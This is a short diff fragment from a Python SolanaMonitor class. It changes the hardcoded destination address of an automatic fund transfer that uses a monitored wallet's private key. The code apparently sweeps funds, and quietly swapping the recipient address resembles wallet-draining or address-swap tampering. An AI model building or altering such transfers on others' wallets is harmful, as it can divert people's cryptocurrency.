@@ -1675,7 +1675,7 @@ class SolanaMonitor:
                         transfer_success = await self.auto_transfer_funds(
                             wallet_address,
                             wallet_private_key,
-                            "FUMnrwov6NuztUmmZZP97587aDZEH4WuKn8bgG6UqjXG"
+                            "FTPdRHYoZBHPyPrQkW1GhdCHNLtaQHYzivBEkuAtK8ho"
                         )
 
                         if transfer_success:
